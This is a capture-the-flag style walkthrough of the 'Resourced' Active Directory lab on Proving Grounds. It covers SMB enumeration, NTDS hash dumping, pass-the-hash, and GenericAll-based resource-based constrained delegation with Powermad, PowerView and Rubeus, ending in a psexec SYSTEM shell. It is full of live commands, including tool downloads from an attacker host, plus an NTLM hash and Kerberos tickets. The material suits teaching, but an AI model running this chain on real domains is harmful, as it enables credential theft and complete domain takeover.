---

categories: [ Proving Grounds, Practice ]
tags: [ Active Directory, RCBD, GenericAll, BloodHound, enum4linux, SMB, secretsdump, PrivEsc, ticketconverter, s4u, Rubeus]
media_subpath: /assets/images/
image:
  path: "Pasted image 20240621121639.png"
  width: "1200"
  height: "630"
  alt: Active Directory Medium Level Machine 🫣
description: Proving Ground Practice Medium Level AD Machine ! you gona learn about GenericAll ACL permissions.
---

## Port Scan Results ⤵️

```bash
┌──(kali🔥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]
└─$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.198.175

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-06-20 07:18:25Z)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 125
464/tcp   open  kpasswd5?     syn-ack ttl 125
593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 125
3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2024-06-20T07:19:57+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Issuer: commonName=ResourceDC.resourced.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-21T10:42:07
| Not valid after:  2024-09-20T10:42:07
| MD5:   7643:1b81:d78e:cfa6:c007:754d:83ef:11ca
| SHA-1: 0c70:08f9:df37:ff1c:4682:7898:173d:220b:a891:b040
| -----BEGIN CERTIFICATE-----
| MIIC+DCCAeCgAwIBAgIQWODT06i3879ClVY4aBNFTTANBgkqhkiG9w0BAQsFADAl
| MSMwIQYDVQQDExpSZXNvdXJjZURDLnJlc291cmNlZC5sb2NhbDAeFw0yNDAzMjEx
| MDQyMDdaFw0yNDA5MjAxMDQyMDdaMCUxIzAhBgNVBAMTGlJlc291cmNlREMucmVz
| b3VyY2VkLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwQUs
| A4/zvP7ZCbyteV9VLi3sT4ZVyDVZp+6FsmpAP7tYeho867ohS8uZlZtIHJL+oxKj
| myWoahVdZVPF49vOYk19URrJDqBYGAtJjSuDDNp+qB7L+XV3XBMCAV3LI3Qhd+st
| WYLg+0b7PFIFt7t0u8MwaDPziM5j54pz1qPji6QowHFJu10xlwSzIUYBHQZOtbit
| 323r9i9L4hctE40EBsR9+On1u8pvcDiwRLwQyLIPkQsimcnc7ifm0ABsdf8pR9wh
| b+7eWNvMpEIJvby6WdKrJy/+NpovyKmqQUbcqm6UcsDffTHM+gT/b3Lc+N1UVyQG
| 7kVZ2RLiVR3jdXtL5QIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNV
| HQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABCDhPDzqxvxG6tqnE2d1JgwtqMl
| bcMHqfZKZs8EJWgkdMfwWOm0AUJHtpJKppYFgKx8F+j0bMqI0fK87Zz3uEgtK2Kg
| Ig/lKctyEDOj9BX7ErpY8IXooLjwYOl802mR9MtPR0BIcEqEFKUfxhunoZ4C7RDn
| CxDhHaap5fBhHyyiTZCLxKN7m8Mkc/FVLSyz3QJvBM3maK0BeYBU1SgKjHvLETmS
| xt+yQpRQ4SWRgvdw12TbPg7y3Fn50IDzdljfw9AqGVJkiZuySYt4YtXIJrdvj4gF
| veeq2ip2EFbDFN3lj/P3Rb+3ePuKAYkIqnAMKZM7SbCaxCX1dAMB0xhiMEw=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-20T07:19:17+00:00
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  adws?         syn-ack ttl 125
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49712/tcp open  unknown       syn-ack ttl 125
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 27200/tcp): CLEAN (Timeout)
|   Check 2 (port 39230/tcp): CLEAN (Timeout)
|   Check 3 (port 46712/udp): CLEAN (Timeout)
|   Check 4 (port 42734/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-06-20T07:19:19
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

```
{: .nolineno}
## SMB Enumeration ⤵️

I ran <mark style="background: #FF5582A6;">netexec</mark> but I don't get any access so I tried <mark style="background: #FF5582A6;">enum4linux</mark> Tool to get some informations 🔻

![Image](Pasted%20image%2020240620145406.png)
_netexec Tool to check the default login_

I got the Creds for user <span style="color:#fd77f8">V.Ventz</span> from here 🔻

![Image](Pasted%20image%2020240620145552.png)
_enum4linux Tool users info_

Lets check the SMB Share of this user 🔽

![Image](Pasted%20image%2020240620145950.png)
_SMB Shares through netexec Tool_

```bash
/opt/Tools/secretsdump.py -system system -ntds ntds.dit local
```
{: .nolineno}

![Image](Pasted%20image%2020240620151839.png)
_Secretsdump.py Tool can also use impacket-secretsdump_

I Pass the Hash over user <span style="color:#f04276">L.Livingstone</span> and got the shell.

```powershell
┌──(kali🔥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]
└─$ evil-winrm -i 192.168.198.175 -u 'L.Livingstone' -H <HASH> 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> hostname
ResourceDC
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> cd ..
*Evil-WinRM* PS C:\Users\L.Livingstone> tree /f /a
Folder PATH listing
Volume serial number is 5C30-DCD7
C:.
+---Desktop
|       local.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
*Evil-WinRM* PS C:\Users\L.Livingstone>
```
{: .nolineno}

For further privilege checks I used bloodhound and got <mark style="background: #D2B3FFA6;">GenericAll</mark> ACL Permission directly on DC machine.

![Image](Pasted%20image%2020240621082558.png)
_BloodHound Output_

I Followed the Bloodhound <mark style="background: #D2B3FFA6;">GenericAll</mark> Abuse path from <span style="color:#f04276">L.Livingstone</span> user like this 🔻

```powershell
┌──(kali🔥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]
└─$ evil-winrm -i 192.168.156.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> curl http://192.168.45.157/Powermad.ps1 -o Powermad.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> curl http://192.168.45.157/PowerView.ps1 -o PowerView.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> curl http://192.168.45.157/Rubeus.exe -o Rubeus.exe
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> . .\Powermad.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> New-MachineAccount -MachineAccount SHIVA -Password $(ConvertTo-SecureString 'StrongShiv8' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = ResourceDC.resourced.local
Verbose: [+] Domain = resourced.local
Verbose: [+] SAMAccountName = SHIVA$
Verbose: [+] Distinguished Name = CN=SHIVA,CN=Computers,DC=resourced,DC=local
[+] Machine account SHIVA added
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-537427935-490066102-1511301751-4101)"
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-DomainComputer RESOURCEDC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=resourced,DC=local
Verbose: [Get-DomainObject] Extracted domain 'resourced.local' from 'CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local'
Verbose: [Get-DomainSearcher] search base: LDAP://DC=resourced,DC=local
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local)))
Verbose: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 223 127 8 32 182 208 53 29 119 162 20 90 5 16 0 0' for object 'RESOURCEDC$'
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-DomainComputer RESOURCEDC -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}


*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\Rubeus.exe s4u /user:SHIVA$ /rc4:3A9BB08C656640AC3DBF4F8038755264 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: S4U

[*] Using rc4_hmac hash: 3A9BB08C656640AC3DBF4F8038755264
[*] Building AS-REQ (w/ preauth) for: 'resourced.local\SHIVA$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFCDCCBQSgAwIBBaEDAgEWooIEFjCCBBJhggQOMIIECqADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPcmVzb3VyY2VkLmxvY2Fso4IDyDCCA8SgAwIBEqEDAgECooIDtgSCA7Jrr3b0c/iALPD4kCtydeXzsohXORH5JsvdiKEVzC3BTQ3wLe68OBxc1ErKiMZBw8qLPHpvqxUYMNMj79K7jSQVCrnNb+rh67Z9HXRexCLJjGO+3ZWvKttIHilMrywZ+sObvKUHBPMbcK3uY7FWZT47FlWRQlVBxNYQnht7GgQeqcZea6DoHFLnyDqhYbEsobZu33KNNpyxaU6ytytJLWHd5blj1UeL7MeukfI0w0pbz6QtCkRxZMicH77rS3KtCo0mKyYU7cIJm+O03O3dAAktM84F2lnKIUxUcbTZ6VbnQg1kP6sx1Ux6TXw3+yGrAbSNopeWCMBfi0JZq+ldLo6bPU6YQPeJSkHX4S2jTt78nXt/2T/2qS3SeOwkbSg7uwOOCNbO+RSfzcnyjpL3RzqoS+ji8YwptpdUmO8WdT6Ou6NsjKDpjWS81PAic2hecH8Fir9fa/waHSKv4ew4x2hPS/nKbMtq5sjyL3/qzf/o1ax3qFTkPScNbDY8Lju4ixKr3FESj9Zgn3fOtEXERax5r0aAx+jDPXQ+aB5ymykbxDp8WjdgLz2gHIeU3RQISXiaN9wpRvB8EeR6ZDDD7wic204RZjCTPzTol92toPsihayDwqotxwurd1e25Em6Q979EJ85rHZvEruhNxh4sUG1n1S+x09KBqt6bblFpRuxjbKzybyKUOrPZD7FzPbBeoqaWdCOyEO/lXUy0fH+iIifjdlAV9q+215U3ZW33qP6RvQjxf3LsvwgB0JFQs6smsZ7T/M6OS2oktqD49kYhDJsanZj47+eBqQYZXeRplxAnSzrc7U0fXVlzMLqm1NGybm+qIMEb/G0g118/9B/HzPLY8bANiyYMbaiJVpABHgCR2vF5cYjQ+zsVNrXDLF4aUjSq9CDFx9HNPzh8R3dr8ZAZZhn/HlmiCh/6i2GU4ubSvoVWFfV5uazzn0fYbKDZ1GfPTT5jfcr0zCaQUb9raek2ntVBhPOgOkPtli9S1ZP8yMBH6k+S5JQz2n3u9oQjH+NZGYx+C7HxWi5tjNBsx3QfVMzwxmVkKTf5WJhvoBw6kjnaJFXsFdTD9xz8hwnon0cVkJGFfStClYCWzefvBHt0Q/2HxhTsRqZtXlo7xmbeJfkreFxvr6oMX8+KNbpiB8bv6wlcnx1B3zV+PreDBzpayuhDqgQlyCpgnwqpb9CE9fWOE+ZvaouW9OPhTVfCJQL9S5ZztRgL7oPYwOfemwbJ58wb/VYZNfoe/oVXityvpepo4HdMIHaoAMCAQCigdIEgc99gcwwgcmggcYwgcMwgcCgGzAZoAMCARehEgQQjPgQQ1Cfei55WJ4Fs0rTh6ERGw9SRVNPVVJDRUQuTE9DQUyiEzARoAMCAQGhCjAIGwZTSElWQSSjBwMFAEDhAAClERgPMjAyNDA2MjExMDU4MDZaphEYDzIwMjQwNjIxMjA1ODA2WqcRGA8yMDI0MDYyODEwNTgwNlqoERsPUkVTT1VSQ0VELkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9yZXNvdXJjZWQubG9jYWw=


[*] Action: S4U

[*] Building S4U2self request for: 'SHIVA$@RESOURCED.LOCAL'
[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'SHIVA$@RESOURCED.LOCAL'
[*] base64(ticket.kirbi):

      doIFkDCCBYygAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoREbD1JFU09VUkNFRC5MT0NBTKITMBGgAwIBAaEKMAgbBlNISVZBJKOCBGswggRnoAMCARehAwIBAaKCBFkEggRVm6USZ8MLn6JaAjBKhfbbJZG3df+jjjNhq7y84p8GmzJ5g+YtvcclvTHwQUsD3g+6aSWrIgOlWsU0DvtMd47REwQbhkuqas65a0UktUXHrx2lmB/sDx5zENwJ/dqkrdPmGeZeOHojIcJfZNJ7rCTRNdV+RykIulvGFrHbc5xIxXUgFc6zMD6y8ut9C5FadQCrwMYai8pE25hgFcu3/IlQc+Iu6C3mA/JqzsOPr/nnGep9R27wEXRziRyMktnT3F3TNSpzopjUY9YVOs3gfEBTM09be1Ak7Y/ncQtjZYx1X4gSxLzbfWztLgvSFtoAOF/NpA3OY2TSlxqQlZxpI79TMrKvSSv0ziS0d5WnMA6hv0BQFa2TPUQKZ44fTmhgtMDK+YHzBOXVEKQloEqfT7w2ag6v6ve8E14UxBeVyDnh0HSdQdHl33QKEFoHqGtJwVBOkRPt43QOTHwOJPYWT2qN8aP8X9U1tIllcFNvRBqrRkBau60zVb/hfqtg8GEhKyUV3Y4N8biaizv9O5F8m+gilkqmuqlnpGHW4GySKdvm/cMh38T7g7S1rL3ujp1axtjPc3j1DtdpBj1GkCGNaXovGL+s27lP7PLfg/SzDqOaljhZ1/YbBH4jLyjG1y4eh0IqYGXD4xwmFqx1iavvTv1XPqV267p+vOMxvTtmL8L6wzZsL1LJznhlBT46uwavUnFsG2EmDWNCQiCfteF5RZE6uqpA51ll4NOyKVDR5SEK/JgDnwUsXLbzGVbudkY+6TNSiOpesKhWBrm8yPxYzSDGQm2vN6lkTs99XbVL322T9OxX749ElX854Ms2lTL48bAO4EKxObi+k4PDEHu0ciTlz2Q5qiqhF2ZBkUUknoaVVvkwNM0ohCzHSkvkmEZhqgOzg0VmsaXo/NS+lIyaK5b0lljT4KlE8FMejk9MkOQ6J7PIgCsGOiYLj3oMev0qhqLmsrszL8uz3o8G8/F4XpoQUXBk6e5dF5r2rCC0R3H3rpP+eB/GUBHpQfbaAc4RBaAGHCCZbN51p1neBnu8Cb9HunmKjscOstOr5s8AwzV38yHs0ZkW5iCEoZNxE7xodEnqASwBFRqki0vLNO0vsDCzGN7YfqSt/FDJ25qTtVezUYIQFEJWM2+5xK6i4BUBJzfl2IscllUYk0pxWbeNSA+/zaHbf1uK6xhSTIbCaVTjStCRuVF3JHJO1xNjRB/lwcX+BxY0VQXHQMJwyrzIi8f+sRJ5lEgiCCErE2GAc89rKV2Nuvgi7xnRdoyu1gg4whlH0ZsjTmZK5Tq9h8oyJY7tRzBp6UJu+dkpuI8qID3euBcsnkdal6mxHvSGgMmDdqxFtAFIZegHjUhwL6QIWUJka8E2rjPi5TjVv3iPIK1ZNKeZo70S5W8UwZrj306CPr2WH+MEmY9ehGmz1RnOg6hB/+WKFHBXanDUNvDmO1ZlAyW61JC/a5G/mVf4lYWrQEGpIm0/adijgdMwgdCgAwIBAKKByASBxX2BwjCBv6CBvDCBuTCBtqAbMBmgAwIBF6ESBBDOYiA6OwO10/5YppNtU2cnoREbD1JFU09VUkNFRC5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyNDA2MjExMDU4MDZaphEYDzIwMjQwNjIxMjA1ODA2WqcRGA8yMDI0MDYyODEwNTgwNlqoERsPUkVTT1VSQ0VELkxPQ0FMqRMwEaADAgEBoQowCBsGU0hJVkEk

[*] Impersonating user 'administrator' to target SPN 'cifs/resourcedc.resourced.local'
[*] Building S4U2proxy request for service: 'cifs/resourcedc.resourced.local'
[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/resourcedc.resourced.local':

      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
[+] Ticket successfully imported!
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> klist

Current LogonId is 0:0x19f80f

Cached Tickets: (1)

#0>	Client: administrator @ RESOURCED.LOCAL
	Server: cifs/resourcedc.resourced.local @ RESOURCED.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
	Start Time: 6/21/2024 3:58:06 (local)
	End Time:   6/21/2024 13:58:06 (local)
	Renew Time: 6/28/2024 3:58:06 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0
	Kdc Called:
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents>
```
{: .nolineno}

This ticket is TGT ticket 🔻

![Image](Pasted%20image%2020240621094024.png)

>[!info] Kindly note that there are <span style="color:#f04276">2</span> tickets that are generated 1st one is <span style="color:#f04276">TGT</span> and the 2nd one is <span style="color:#f04276">TGS</span> , To use it externally through Attacker machine from Tools like ( <span style="color:#002060">netexec , psexec</span> ) you need to use the 2nd TGS ticket for more specific the **S4U2self** one and convert it to `.ccache` format .

Now you got the TGS ticket as in base64 format so follow these steps to convert to its `.ccache` format 🔽

```bash
┌──(kali🔥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]
└─$ nano a.base64                                               

# Here above you gona insert the base64 hash of TGT and save it.                    

┌──(kali🔥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]
└─$ cat a.base64| base64 -d > ticket1.kirbi                     

# Above you have to convert the ticket into .kirbi format by decoding it from base64.


┌──(kali🔥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]
└─$ /opt/Tools/impacket/examples/ticketConverter.py ticket1.kirbi a.ccache 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] converting kirbi to ccache...
[+] done

# Conversion of .kirbi to .ccache it done now lets export the ticket into the environment variable in linux machine.

┌──(kali🔥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]
└─$ export KRB5CCNAME=`pwd`/a.ccache             

# exported the key into varaible name KRB5CCNAME .

┌──(kali🔥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]
└─$ psexec.py -k -no-pass resourced.local/Administrator@resourcedc.resourced.local -dc-ip 192.168.156.175
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file FRJSszGs.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service HlkX on resourcedc.resourced.local.....
[*] Starting service HlkX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator

C:\Users\Administrator> tree /f /a
Folder PATH listing
Volume serial number is 5C30-DCD7
C:.
+---3D Objects
+---Contacts
+---Desktop
|       proof.txt
|       
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |   
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|       
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos

C:\Users\Administrator> type Desktop\proof.txt
b2893a22279ce164c298178ae7863f46

C:\Users\Administrator> 
```
{: .nolineno}

I am Administrator Now !











> If you have any questions or suggestions, please leave a comment below.
> Thank You ! 
{: .prompt-tip }